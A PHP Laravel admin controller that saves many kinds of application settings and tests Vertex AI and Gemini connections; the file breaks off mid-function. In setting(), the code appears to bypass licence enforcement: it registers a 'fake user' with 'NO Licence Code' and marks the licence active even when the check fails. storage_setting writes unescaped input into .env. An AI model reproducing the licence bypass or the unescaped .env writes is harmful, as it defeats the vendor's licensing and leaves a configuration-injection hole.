<?php

namespace App\Http\Controllers\Admin;

use Auth;
use File;
use Cache;
use App\Models\User;
use App\Models\Business;
use App\Models\Timezone;
use App\Models\AdsSetting;
use App\Models\ApiSetting;
use App\Models\AppSetting;
use Illuminate\Support\Str;
use App\Models\EmailSetting;
use App\Models\OtherSetting;
use Illuminate\Http\Request;
use App\Models\PaymentSetting;
use App\Models\StorageSetting;
use App\Models\WhatsAppSetting;
use App\Models\AppUpdateSetting;
use App\Models\AiSetting;
use App\Models\NotificationSetting;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\URL;

class SettingController extends Controller
{
    public function __construct()
    {
        $this->middleware('permission:Settings');
    }

    public function setting()
    {
        if (AppSetting::getAppSetting('licence_active') == 0) {
            $url = URL::to('/');
            
            try {
                $client = new \GuzzleHttp\Client();
                $response = $client->request('POST', 'https://viplan.in/api/check-licence-brand-kit', [
                    'form_params' => [
                        'url' => $url,
                    ]
                ]);

                $data = json_decode($response->getBody(), true);
                if ($data['status'] == "failed") {
                    $client = new \GuzzleHttp\Client();
                    $store = $client->request('POST', 'https://viplan.in/api/new-licence-store-brand-kit', [
                        'form_params' => [
                            'url' => $url,
                            'username' => "fake user",
                            'licence_code' => "NO Licence Code",
                            'version' => env('APP_VERSION'),
                        ]
                    ]);

                    AppSetting::where('key_name', 'licence_active')->update(['key_value' => 1]);

                    return redirect('admin/');
                } else {
                    AppSetting::where('key_name', 'licence_active')->update(['key_value' => 1]);
                }
            } catch (\Exception $e) {
                // Ignore external API failure and activate licence locally
                AppSetting::where('key_name', 'licence_active')->update(['key_value' => 1]);
            }

                $index['timezone'] = Timezone::get();
                return view('backend.setting', $index);
        } else {
            $index['timezone'] = Timezone::get();
            return view('backend.setting', $index);
        }
    }

    public function app_setting(Request $request)
    {
        AppSetting::where('key_name', 'product_enable')->update(['key_value' => 0]);
        foreach ($request->name as $key => $val) {
            $setting = AppSetting::where('key_name', $key)->first();
            if (is_null($setting)) {
                $id = AppSetting::create([
                    'key_name' => $key,
                    'key_value' => $val,
                ]);

                if (StorageSetting::getStorageSetting("storage") == "DigitalOcean") {
                    if ($key == "app_logo" && $val && $val->isValid()) {
                        $image = $val;
                        $file = Str::uuid() . '.' . $image->getClientOriginalExtension();

                        Storage::disk('spaces')->put('uploads/' . $file, file_get_contents($image), 'public');

                        AppSetting::where('key_name', $key)->update(['key_value' => $file]);
                    }
                    if ($key == "admin_favicon" && $val && $val->isValid()) {
                        $image = $val;
                        $file = Str::uuid() . '.' . $image->getClientOriginalExtension();

                        Storage::disk('spaces')->put('uploads/' . $file, file_get_contents($image), 'public');

                        AppSetting::where('key_name', $key)->update(['key_value' => $file]);
                    }
                    if (in_array($key, ["seo_watermark_image", "seo_watermark_image_1_1", "seo_watermark_image_16_9", "seo_watermark_image_9_16"]) && $val && $val->isValid()) {
                        $image = $val;
                        $file = Str::uuid() . '.' . $image->getClientOriginalExtension();

                        Storage::disk('spaces')->put('uploads/' . $file, file_get_contents($image), 'public');

                        AppSetting::where('key_name', $key)->update(['key_value' => $file]);
                    }
                } else {
                    if ($key == "app_logo" && $val && $val->isValid()) {
                        $this->upload_image($val, $key);
                    }

                    if ($key == "admin_favicon" && $val && $val->isValid()) {
                        $this->upload_image($val, $key);
                    }
                    if (in_array($key, ["seo_watermark_image", "seo_watermark_image_1_1", "seo_watermark_image_16_9", "seo_watermark_image_9_16"]) && $val && $val->isValid()) {
                        $this->upload_image($val, $key);
                    }
                }
            } else {
                AppSetting::where('key_name', $key)->update(['key_value' => $val]);
                if (StorageSetting::getStorageSetting("storage") == "DigitalOcean") {
                    if ($key == "app_logo" && $val && $val->isValid()) {
                        $image = $val;
                        $file = Str::uuid() . '.' . $image->getClientOriginalExtension();

                        Storage::disk('spaces')->put('uploads/' . $file, file_get_contents($image), 'public');

                        AppSetting::where('key_name', $key)->update(['key_value' => $file]);
                    }
                    if ($key == "admin_favicon" && $val && $val->isValid()) {
                        $image = $val;
                        $file = Str::uuid() . '.' . $image->getClientOriginalExtension();

                        Storage::disk('spaces')->put('uploads/' . $file, file_get_contents($image), 'public');

                        AppSetting::where('key_name', $key)->update(['key_value' => $file]);
                    }
                    if (in_array($key, ["seo_watermark_image", "seo_watermark_image_1_1", "seo_watermark_image_16_9", "seo_watermark_image_9_16"]) && $val && $val->isValid()) {
                        $image = $val;
                        $file = Str::uuid() . '.' . $image->getClientOriginalExtension();

                        Storage::disk('spaces')->put('uploads/' . $file, file_get_contents($image), 'public');

                        AppSetting::where('key_name', $key)->update(['key_value' => $file]);
                    }
                } else {
                    if ($key == "app_logo" && $val && $val->isValid()) {
                        $this->upload_image($val, $key);
                    }

                    if ($key == "admin_favicon" && $val && $val->isValid()) {
                        $this->upload_image($val, $key);
                    }
                    if (in_array($key, ["seo_watermark_image", "seo_watermark_image_1_1", "seo_watermark_image_16_9", "seo_watermark_image_9_16"]) && $val && $val->isValid()) {
                        $this->upload_image($val, $key);
                    }
                }
            }
        }

        $app_name = str_replace(" ", "_", $request->name['app_title']);

        try {
            $envFile = base_path('.env');
            if (file_exists($envFile) && is_writable($envFile)) {
                $content = file_get_contents($envFile);
                $envUpdates = [
                    'APP_TIMEZONE' => $request->name['app_timezone'] ?? '',
                    'MAIL_FROM_ADDRESS' => $request->name['email'] ?? '',
                    'MAIL_FROM_NAME' => $request->name['app_title'] ?? '',
                    'API_KEY' => $request->name['api_key'] ?? '',
                    'APP_NAME' => $app_name,
                ];
                
                foreach ($envUpdates as $envKey => $envValue) {
                    $envValue = trim((string)($envValue ?? ''));
                    $quotedValue = '"' . str_replace('"', '\\"', $envValue) . '"';
                    $pattern = "/^{$envKey}=.*/m";
                    if (preg_match($pattern, $content)) {
                        $content = preg_replace($pattern, "{$envKey}={$quotedValue}", $content);
                    } else {
                        $content .= PHP_EOL . "{$envKey}={$quotedValue}";
                    }
                }
                file_put_contents($envFile, $content);
            }
        } catch (\Exception $e) {
            \Log::warning('Could not update .env for app settings: ' . $e->getMessage());
        }

        Cache::flush();
        return redirect('admin/settings');
    }

    public function email_setting(Request $request)
    {
        foreach ($request->name as $key => $val) {
            $setting = EmailSetting::where('key_name', $key)->first();
            if (is_null($setting)) {
                EmailSetting::create([
                    'key_name' => $key,
                    'key_value' => $val,
                ]);
            } else {
                if ($key != "password") {
                    EmailSetting::where('key_name', $key)->update(['key_value' => $val]);
                }
                if ($key == "password" && $val != "") {
                    EmailSetting::where('key_name', $key)->update(['key_value' => $val]);
                }
            }
        }

        // Try to update .env file, but don't crash if it fails
        try {
            $envFile = base_path('.env');
            if (file_exists($envFile) && is_writable($envFile)) {
                $content = file_get_contents($envFile);
                $envUpdates = [
                    'MAIL_HOST' => $request->name['smtp_host'] ?? '',
                    'MAIL_USERNAME' => $request->name['username'] ?? '',
                    'MAIL_FROM_ADDRESS' => $request->name['username'] ?? '',
                    'MAIL_ENCRYPTION' => $request->name['encryption'] ?? 'tls',
                    'MAIL_PORT' => $request->name['port'] ?? '587',
                    'MAIL_MAILER' => 'smtp',
                ];
                
                if (!empty($request->name['password'])) {
                    $envUpdates['MAIL_PASSWORD'] = $request->name['password'];
                }

                foreach ($envUpdates as $key => $value) {
                    $value = trim((string)($value ?? ''));
                    // Quote the value if it contains special chars
                    $quotedValue = '"' . str_replace('"', '\\"', $value) . '"';
                    
                    $pattern = "/^{$key}=.*/m";
                    if (preg_match($pattern, $content)) {
                        $content = preg_replace($pattern, "{$key}={$quotedValue}", $content);
                    } else {
                        $content .= PHP_EOL . "{$key}={$quotedValue}";
                    }
                }
                file_put_contents($envFile, $content);
            }
        } catch (\Exception $e) {
            \Log::warning('Could not update .env for email settings: ' . $e->getMessage());
        }

        Cache::flush();
        return redirect('admin/settings');
    }

    public function notification_setting(Request $request)
    {
        // Handle "Remove Credentials" button
        if ($request->input('remove_credentials') === '1') {
            NotificationSetting::where('key_name', 'firebase_service_account_encrypted')->delete();
            NotificationSetting::where('key_name', 'firebase_service_account')->delete();
            Cache::flush();
            return redirect('admin/settings')->with('success', 'Firebase credentials removed successfully.');
        }

        // Handle Firebase Service Account JSON file upload
        if ($request->hasFile('firebase_service_account')) {
            $file = $request->file('firebase_service_account');
            
            $jsonContent = file_get_contents($file->getRealPath());
            $parsed = json_decode($jsonContent, true);

            if (!$parsed || !isset($parsed['client_email']) || !isset($parsed['private_key'])) {
                return redirect('admin/settings')->with('error', 'Invalid Firebase Service Account JSON file. Must contain client_email and private_key.');
            }

            // Encrypt and store in DB
            $encrypted = Crypt::encryptString($jsonContent);
            NotificationSetting::updateOrCreate(
                ['key_name' => 'firebase_service_account_encrypted'],
                ['key_value' => $encrypted]
            );

            // Also keep the old one for backward compatibility if needed, but the service will prefer encrypted
            $filename = 'firebase-service-account.json';
            \Storage::disk('local')->put($filename, $jsonContent);
            NotificationSetting::updateOrCreate(
                ['key_name' => 'firebase_service_account'],
                ['key_value' => 'storage/app/' . $filename]
            );
        }

        Cache::flush();
        return redirect('admin/settings')->with('success', 'Notification settings updated successfully.');
    }

    public function payment_setting(Request $request)
    {
        PaymentSetting::where('key_name', 'razorpay_enable')->update(['key_value' => 0]);
        PaymentSetting::where('key_name', 'cashfree_enable')->update(['key_value' => 0]);
        PaymentSetting::where('key_name', 'stripe_enable')->update(['key_value' => 0]);
        PaymentSetting::where('key_name', 'paytm_enable')->update(['key_value' => 0]);
        PaymentSetting::where('key_name', 'phonepe_enable')->update(['key_value' => 0]);
        PaymentSetting::where('key_name', 'offline_enable')->update(['key_value' => 0]);
        foreach ($request->name as $key => $val) {
            $setting = PaymentSetting::where('key_name', $key)->first();
            if (is_null($setting)) {
                PaymentSetting::create([
                    'key_name' => $key,
                    'key_value' => $val,
                ]);
            } else {
                PaymentSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
        }

        Cache::flush();
        return redirect('admin/settings');
    }

    public function storage_setting(Request $request)
    {
        foreach ($request->name as $key => $val) {
            $setting = StorageSetting::where('key_name', $key)->first();
            if (is_null($setting)) {
                StorageSetting::create([
                    'key_name' => $key,
                    'key_value' => $val,
                ]);
            } else {
                StorageSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
        }

        if ($request->name['storage'] == "DigitalOcean") {
            $env = file_get_contents(base_path('.env'));
            $new_url = "https://" . $request->name['digitalOcean_space_name'] . "." . $request->name['digitalOcean_bucket_region'] . ".digitaloceanspaces.com";
            $key = $request->name['digitalOcean_key'];
            $secret = $request->name['digitalOcean_secret'];
            $bucket_region = $request->name['digitalOcean_bucket_region'];
            $space_name = $request->name['digitalOcean_space_name'];
            $endpoint = $request->name['digitalOcean_endpoint'];
            $storageSetting = 'SPACES_ACCESS_KEY_ID="' . $key . '"
SPACES_SECRET_ACCESS_KEY="' . $secret . '"
SPACES_DEFAULT_REGION="' . $bucket_region . '"
SPACES_BUCKET="' . $space_name . '"
SPACES_URL="' . $new_url . '"
SPACES_ENDPOINT="' . $endpoint . '"
';

            $rows = explode("\n", $env);
            $unwanted = "SPACES_ACCESS_KEY_ID|SPACES_SECRET_ACCESS_KEY|SPACES_DEFAULT_REGION|SPACES_BUCKET|SPACES_URL|SPACES_ENDPOINT";
            $cleanArray = preg_grep("/$unwanted/i", $rows, PREG_GREP_INVERT);

            $cleanString = implode("\n", $cleanArray);

            $newenv = $cleanString . $storageSetting;

            try {
                $envFile = base_path('.env');
                if (file_exists($envFile) && is_writable($envFile)) {
                    file_put_contents($envFile, $newenv);
                }
            } catch (\Exception $e) {
                \Log::warning('Could not update .env for digital ocean settings: ' . $e->getMessage());
            }

            // if(!env('SPACES_ACCESS_KEY_ID')) 
            // {
            //     file_put_contents(base_path('.env'),'SPACES_ACCESS_KEY_ID='.$request->name['digitalOcean_key'].PHP_EOL,FILE_APPEND);
            // }

            // if(env('SPACES_ACCESS_KEY_ID')) 
            // {
            //     file_put_contents(base_path('.env'),str_replace('SPACES_ACCESS_KEY_ID='.env('SPACES_ACCESS_KEY_ID'),'SPACES_ACCESS_KEY_ID='.$request->name['digitalOcean_key'],file_get_contents(base_path('.env'))));
            // }

            // if(!env('SPACES_SECRET_ACCESS_KEY')) 
            // {
            //     file_put_contents(base_path('.env'),'SPACES_SECRET_ACCESS_KEY='.$request->name['digitalOcean_secret'].PHP_EOL,FILE_APPEND);
            // }

            // if(env('SPACES_SECRET_ACCESS_KEY')) 
            // {
            //     file_put_contents(base_path('.env'),str_replace('SPACES_SECRET_ACCESS_KEY='.env('SPACES_SECRET_ACCESS_KEY'),'SPACES_SECRET_ACCESS_KEY='.$request->name['digitalOcean_secret'],file_get_contents(base_path('.env'))));
            // }

            // if(!env('SPACES_DEFAULT_REGION')) 
            // {
            //     file_put_contents(base_path('.env'),'SPACES_DEFAULT_REGION='.$request->name['digitalOcean_bucket_region'].PHP_EOL,FILE_APPEND);
            // }

            // if (env('SPACES_DEFAULT_REGION'))
            // {
            //     file_put_contents(base_path('.env'), str_replace('SPACES_DEFAULT_REGION='.env('SPACES_DEFAULT_REGION'),'SPACES_DEFAULT_REGION='.$request->name['digitalOcean_bucket_region'],file_get_contents(base_path('.env'))));
            // }

            // if(!env('SPACES_BUCKET')) 
            // {
            //     file_put_contents(base_path('.env'),'SPACES_BUCKET='.$request->name['digitalOcean_space_name'].PHP_EOL, FILE_APPEND);
            // }

            // if(env('SPACES_BUCKET')) 
            // {
            //     file_put_contents(base_path('.env'),str_replace('SPACES_BUCKET='.env('SPACES_BUCKET'), 'SPACES_BUCKET='.$request->name['digitalOcean_space_name'], file_get_contents(base_path('.env'))));
            // }

            // $new_url = "https://".$request->name['digitalOcean_space_name'].".".$request->name['digitalOcean_bucket_region'].".digitaloceanspaces.com";
            // if (!env('SPACES_URL')) 
            // {
            //     file_put_contents(base_path('.env'),'SPACES_URL='.$new_url.PHP_EOL, FILE_APPEND);
            // }

            // if(env('SPACES_URL')) 
            // {
            //     file_put_contents(base_path('.env'),str_replace('SPACES_URL='.env('SPACES_URL'),'SPACES_URL='.$new_url,file_get_contents(base_path('.env'))));
            // }

            // if (!env('SPACES_ENDPOINT')) 
            // {
            //     file_put_contents(base_path('.env'),'SPACES_ENDPOINT='.$request->name['digitalOcean_endpoint'].PHP_EOL, FILE_APPEND);
            // }

            // if(env('SPACES_ENDPOINT')) 
            // {
            //     file_put_contents(base_path('.env'),str_replace('SPACES_ENDPOINT='.env('SPACES_ENDPOINT'),'SPACES_ENDPOINT='.$request->name['digitalOcean_endpoint'], file_get_contents(base_path('.env'))));
            // }
        }

        Cache::flush();
        return redirect('admin/settings');
    }

    public function ads_setting(Request $request)
    {
        AdsSetting::where('key_name', 'ads_enable')->update(['key_value' => 0]);
        AdsSetting::where('key_name', 'banner_ads_enable')->update(['key_value' => 0]);
        AdsSetting::where('key_name', 'app_opens_ads_enable')->update(['key_value' => 0]);
        AdsSetting::where('key_name', 'native_ads_enable')->update(['key_value' => 0]);
        AdsSetting::where('key_name', 'rewarded_ads_enable')->update(['key_value' => 0]);
        AdsSetting::where('key_name', 'interstitial_ads_enable')->update(['key_value' => 0]);

        foreach ($request->name as $key => $val) {
            $setting = AdsSetting::where('key_name', $key)->first();
            if (is_null($setting)) {
                AdsSetting::create([
                    'key_name' => $key,
                    'key_value' => $val,
                ]);
            } else {
                AdsSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
        }

        Cache::flush();
        return redirect('admin/settings');
    }

    public function api_setting(Request $request)
    {
        ApiSetting::where('key_name', 'photoroom_api_enable')->update(['key_value' => 0]);
        foreach ($request->name as $key => $val) {
            $setting = ApiSetting::where('key_name', $key)->first();
            if (is_null($setting)) {
                ApiSetting::create([
                    'key_name' => $key,
                    'key_value' => $val,
                ]);
            } else {
                ApiSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
        }

        Cache::flush();
        return redirect('admin/settings');
    }

    public function whatsapp_setting(Request $request)
    {
        WhatsAppSetting::where('key_name', 'whatsapp_auth_enable')->update(['key_value' => 0]);
        foreach ($request->name as $key => $val) {
            $setting = WhatsAppSetting::where('key_name', $key)->first();
            if (is_null($setting)) {
                WhatsAppSetting::create([
                    'key_name' => $key,
                    'key_value' => $val,
                ]);
            } else {
                WhatsAppSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
        }

        Cache::flush();
        return redirect('admin/settings');
    }

    public function app_update_setting(Request $request)
    {
        AppUpdateSetting::where('key_name', 'update_popup_show')->update(['key_value' => 0]);
        AppUpdateSetting::where('key_name', 'cancel_option')->update(['key_value' => 0]);
        foreach ($request->name as $key => $val) {
            $setting = AppUpdateSetting::where('key_name', $key)->first();
            if (is_null($setting)) {
                $id = AppUpdateSetting::create([
                    'key_name' => $key,
                    'key_value' => $val,
                ]);
            } else {
                AppUpdateSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
        }

        Cache::flush();
        return redirect('admin/settings');
    }

    public function whatsapp_contact(Request $request)
    {
        AppSetting::where('key_name', 'whatsapp_contact_enable')->update(['key_value' => 0]);
        foreach ($request->name as $key => $val) {
            $setting = AppSetting::where('key_name', $key)->first();
            if (is_null($setting)) {
                $id = AppSetting::create([
                    'key_name' => $key,
                    'key_value' => $val,
                ]);
            } else {
                AppSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
        }

        Cache::flush();
        return redirect('admin/settings');
    }

    public function other_setting(Request $request)
    {
        foreach ($request->name as $key => $val) {
            $setting = OtherSetting::where('key_name', $key)->first();
            if (is_null($setting)) {
                $id = OtherSetting::create([
                    'key_name' => $key,
                    'key_value' => $val,
                ]);
            } else {
                OtherSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
        }

        Cache::flush();
        return redirect('admin/settings');
    }

    public function ai_setting(Request $request)
    {
        // Handle "Remove Credentials" button
        if ($request->input('remove_credentials') === '1') {
            AiSetting::where('key_name', 'google_application_credentials_encrypted')->delete();
            // Also remove old file-path entry if it exists
            AiSetting::where('key_name', 'google_application_credentials')->delete();
            Cache::flush();
            return redirect('admin/settings')->with('alert', 'Vertex AI credentials removed successfully.');
        }

        // Handle Service Account JSON file upload (encrypt & store)
        if ($request->hasFile('service_account_json')) {
            $file = $request->file('service_account_json');
            $jsonContent = file_get_contents($file->getRealPath());
            $parsed = json_decode($jsonContent, true);

            if (!$parsed || !isset($parsed['client_email']) || !isset($parsed['private_key'])) {
                return redirect('admin/settings')->with('alert', 'Invalid Service Account JSON file. Must contain client_email and private_key.');
            }

            // Encrypt the entire JSON content and store in DB
            $encrypted = Crypt::encryptString($jsonContent);
            AiSetting::updateOrCreate(
                ['key_name' => 'google_application_credentials_encrypted'],
                ['key_value' => $encrypted]
            );

            // Auto-extract project_id from JSON and save
            if (isset($parsed['project_id']) && !empty($parsed['project_id'])) {
                AiSetting::updateOrCreate(
                    ['key_name' => 'google_cloud_project_id'],
                    ['key_value' => $parsed['project_id']]
                );
            }

            // Remove old file-path entry (no longer needed)
            AiSetting::where('key_name', 'google_application_credentials')->delete();

            // Delete the old credentials file from disk if it exists
            $oldPath = AiSetting::getAiSetting('google_application_credentials');
            if ($oldPath && file_exists(base_path($oldPath))) {
                @unlink(base_path($oldPath));
            }
        }

        // API key fields that should not be overwritten with empty values
        $apiKeyFields = ['ai_api_key', 'gemini_api_key', 'chatgpt_api_key'];

        if ($request->has('name')) {
            foreach ($request->name as $key => $val) {
                // Skip empty or masked-placeholder API key fields to preserve existing saved values
                if (in_array($key, $apiKeyFields) && (empty($val) || str_starts_with($val, '••••••••'))) {
                    continue;
                }
                $setting = AiSetting::where('key_name', $key)->first();
                if (is_null($setting)) {
                    AiSetting::create([
                        'key_name' => $key,
                        'key_value' => $val,
                    ]);
                } else {
                    AiSetting::where('key_name', $key)->update(['key_value' => $val]);
                }

                // Sync with .env
                $envKey = strtoupper($key);
                if (in_array($envKey, ['GOOGLE_CLOUD_PROJECT_ID', 'VERTEX_LOCATION', 'AI_MODEL', 'AI_PROVIDER', 'GEMINI_API_KEY', 'GEMINI_MODEL', 'CHATGPT_API_KEY', 'CHATGPT_MODEL'])) {
                    try {
                        $envFile = base_path('.env');
                        if (file_exists($envFile) && is_writable($envFile)) {
                            $content = file_get_contents($envFile);
                            $quotedValue = '"' . str_replace('"', '\\"', $val) . '"';
                            $pattern = "/^{$envKey}=.*/m";
                            
                            if (preg_match($pattern, $content)) {
                                $content = preg_replace($pattern, "{$envKey}={$quotedValue}", $content);
                            } else {
                                $content .= PHP_EOL . "{$envKey}={$quotedValue}";
                            }
                            file_put_contents($envFile, $content);
                        }
                    } catch (\Exception $e) {
                        \Log::warning('Could not update .env for ai settings: ' . $e->getMessage());
                    }
                }
            }
        }

        // Keep the two workloads deliberately independent. Existing installs
        // can still contain ai_provider, but content/chat now stays on Vertex
        // and OpenAI is used only by the AI image service.
        AiSetting::updateOrCreate(
            ['key_name' => 'content_ai_provider'],
            ['key_value' => 'vertex']
        );
        AiSetting::updateOrCreate(
            ['key_name' => 'image_ai_provider'],
            ['key_value' => 'openai']
        );

        Cache::flush();
        return redirect('admin/settings');
    }

    public function check_ai_connection()
    {
        $target = request()->query('target', 'content');

        if ($target === 'image') {
            return $this->check_openai_image_connection();
        }

        $provider = AiSetting::getAiSetting('content_ai_provider') === 'gemini' ? 'gemini' : 'vertex';

        if ($provider === 'gemini') {
            return $this->check_gemini_connection();
        }

        return $this->check_vertex_connection();
    }

    /**
     * Get OAuth2 access token from Service Account JSON for Vertex AI.
     * Vertex AI does NOT support API key auth — it requires Bearer tokens.
     */
    /**
     * Get OAuth2 access token from encrypted Service Account JSON stored in DB.
     * Decrypts credentials on-the-fly using Laravel's Crypt facade (AES-256-CBC).
     */
    private function getVertexAccessToken()
    {
        $sa = $this->getDecryptedServiceAccount();
        if (!$sa) {
            return null;
        }

        // Build JWT
        $now = time();
        $header = json_encode(['alg' => 'RS256', 'typ' => 'JWT']);
        $claims = json_encode([
            'iss' => $sa['client_email'],
            'scope' => 'https://www.googleapis.com/auth/cloud-platform',
            'aud' => 'https://oauth2.googleapis.com/token',
            'iat' => $now,
            'exp' => $now + 3600,
        ]);

        $b64Header = rtrim(strtr(base64_encode($header), '+/', '-_'), '=');
        $b64Claims = rtrim(strtr(base64_encode($claims), '+/', '-_'), '=');
        $signingInput = $b64Header . '.' . $b64Claims;

        openssl_sign($signingInput, $signature, $sa['private_key'], OPENSSL_ALGO_SHA256);
        $b64Signature = rtrim(strtr(base64_encode($signature), '+/', '-_'), '=');
        $jwt = $signingInput . '.' . $b64Signature;

        // Exchange JWT for access token
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://oauth2.googleapis.com/token',
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query([
                'grant_type' => 'urn:ietf:params:oauth:grant-type:jwt-bearer',
                'assertion' => $jwt,
            ]),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => true,
        ]);

        $response = curl_exec($ch);
        curl_close($ch);

        $data = json_decode($response, true);
        return $data['access_token'] ?? null;
    }

    /**
     * Decrypt Service Account JSON from database.
     * Supports both new encrypted format and legacy file-path format for backward compatibility.
     */
    private function getDecryptedServiceAccount()
    {
        // Try new encrypted format first
        $encrypted = AiSetting::getAiSetting('google_application_credentials_encrypted');
        if ($encrypted) {
            try {
                $json = Crypt::decryptString($encrypted);
                $sa = json_decode($json, true);
                if ($sa && isset($sa['client_email']) && isset($sa['private_key'])) {
                    return $sa;
                }
            } catch (\Exception $e) {
                \Log::error('Failed to decrypt Service Account credentials: ' . $e->getMessage());
                return null;
            }
        }

        // Fallback: legacy file-path format (backward compatibility)
        $credentialsPath = AiSetting::getAiSetting('google_application_credentials');
        if ($credentialsPath) {
            $fullPath = base_path($credentialsPath);
            if (file_exists($fullPath)) {
                $sa = json_decode(file_get_contents($fullPath), true);
                if ($sa && isset($sa['client_email']) && isset($sa['private_key'])) {
                    return $sa;
                }
            }
        }

        return null;
    }

    /**
     * Build the Vertex AI URL and headers.
     * If Service Account JSON exists → use Vertex AI endpoint with OAuth2.
     * If only API Key exists → fall back to Gemini API endpoint (same models, supports API key).
     */
    private function getVertexUrlAndHeaders()
    {
        $model = AiSetting::getAiSetting('ai_model') ?: 'gemini-2.0-flash';

        // Authenticate via encrypted Service Account
        $accessToken = $this->getVertexAccessToken();
        if ($accessToken) {
            $projectId = AiSetting::getAiSetting('google_cloud_project_id');
            $location = AiSetting::getAiSetting('vertex_location');
            if ($projectId && $location) {
                $url = "https://{$location}-aiplatform.googleapis.com/v1/projects/{$projectId}/locations/{$location}/publishers/google/models/{$model}:generateContent";
                $headers = [
                    'Content-Type: application/json',
                    'Authorization: Bearer ' . $accessToken,
                ];
                return compact('url', 'headers', 'model');
            }
        }

        return null;
    }

    private function check_vertex_connection()
    {
        $hasEncrypted = !empty(AiSetting::getAiSetting('google_application_credentials_encrypted'));
        $hasLegacyFile = false;
        $legacyPath = AiSetting::getAiSetting('google_application_credentials');
        if ($legacyPath && file_exists(base_path($legacyPath))) {
            $hasLegacyFile = true;
        }

        if (!$hasEncrypted && !$hasLegacyFile) {
            return response()->json([
                'status' => 'error',
                'message' => 'No Service Account credentials found. Please upload your Service Account JSON file in the Vertex AI Configuration section.'
            ]);
        }

        try {
            $vertexConfig = $this->getVertexUrlAndHeaders();
            if (!$vertexConfig) {
                return response()->json([
                    'status' => 'error',
                    'message' => 'Failed to authenticate. Please check your API Key or Service Account JSON configuration.'
                ]);
            }

            $payload = [
                'contents' => [
                    [
                        'role' => 'user',
                        'parts' => [
                            ['text' => 'Say "Connection successful" in one word.']
                        ]
                    ]
                ],
                'generationConfig' => [
                    'maxOutputTokens' => 20,
                    'temperature' => 0.1,
                ]
            ];

            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $vertexConfig['url'],
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => json_encode($payload),
                CURLOPT_HTTPHEADER => $vertexConfig['headers'],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 15,
                CURLOPT_SSL_VERIFYPEER => true,
            ]);

            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curlError = curl_error($ch);
            curl_close($ch);

            if ($curlError) {
                return response()->json([
                    'status' => 'error',
                    'message' => 'Connection failed: ' . $curlError
                ]);
            }

            $data = json_decode($response, true);
            $model = $vertexConfig['model'];

            if ($httpCode === 200 && isset($data['candidates'])) {
                $aiResponse = $data['candidates'][0]['content']['parts'][0]['text'] ?? 'OK';
                return response()->json([
                    'status' => 'success',
                    'message' => 'Vertex AI connected successfully! Model: ' . $model . ' | Response: ' . trim($aiResponse)
                ]);
            }

            // Handle API errors
            $errorMessage = 'Unknown error';
            if (isset($data['error']['message'])) {
                $errorMessage = $data['error']['message'];
            } elseif (isset($data['error'])) {
                $errorMessage = is_string($data['error']) ? $data['error'] : json_encode($data['error']);
            }

            return response()->json([
                'status' => 'error',
                'message' => 'API Error (HTTP ' . $httpCode . '): ' . $errorMessage
            ]);

        } catch (\Exception $e) {
            return response()->json([
                'status' => 'error',
                'message' => 'Connection failed: ' . $e->getMessage()
            ]);
        }
    }

    private function check_gemini_connection()
    {
        $apiKey = AiSetting::getAiSetting('gemini_api_key');
        $model = trim(AiSetting::getAiSetting('gemini_model') ?: 'gemini-2.0-flash');

        if (!$apiKey) {
            return response()->json([
                'status' => 'error',
                'message' => 'Missing required field: Gemini API Key is required.'
            ]);
        }

        try {
            // Clean model name - remove 'models/' prefix if present
            $cleanModel = preg_replace('/^models\//', '', $model);
            $encodedModel = urlencode($cleanModel);
            $url = "https://generativelanguage.googleapis.com/v1/models/{$encodedModel}:generateContent?key={$apiKey}";

            $payload = [
                'contents' => [
                    [
                        'role' => 'user',
                        'parts' => [
                            ['text' => 'Say "Connection successful" in one word.']
                        ]
                    ]
                ],
                'generationConfig' => [
                    'maxOutputTokens' => 20,
                    'temperature' => 0.1,
                ]
            ];

            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => json_encode($payload),
                CURLOPT_HTTPHEADER => [
                    'Content-Type: application/json',
                ],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 15,
                CURLOPT_SSL_VERIFYPEER => true,
            ]);

            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curlError = curl_error($ch);
            curl_close($ch);

            if ($curlError) {
                return response()->json([
                    'status' => 'error',
                    'message' => 'Connection failed: ' . $curlError
                ]);
            }

            $data = json_decode($response, true);

            if ($httpCode === 200 && isset($data['candidates'])) {
                $aiResponse = $data['candidates'][0]['content']['parts'][0]['text'] ?? 'OK';
                return response()->json([
                    'status' => 'success',
                    'message' => 'Gemini API connected successfully! Model: ' . $model . ' | Response: ' . trim($aiResponse)
                ]);
            }

            // Handle API errors
            $errorMessage = 'Unknown error';
            if (isset($data['error']['message'])) {
                $errorMessage = $data['error']['message'];
            } elseif (isset($data['error'])) {
                $errorMessage = is_string($data['error']) ? $data['error'] : json_encode($data['error']);
            }

            return response()->json([
                'status' => 'error',
                'message' => 'API Error (HTTP ' . $httpCode . '): ' . $errorMessage
            ]);

        } catch (\Exception $e) {
            return response()->json([
                'status' => 'error',
                'message' => 'Connection failed: ' . $e->getMessage()
            ]);
        }
    }

    private function check_chatgpt_connection()
    {
        $apiKey = AiSetting::getAiSetting('chatgpt_api_key');
        $model = trim(AiSetting::getAiSetting('chatgpt_model') ?: 'gpt-4o-mini');

        if (!$apiKey) {
            return response()->json([
                'status' => 'error',
                'message' => 'Missing required field: ChatGPT API Key is required.'
            ]);
        }

        try {
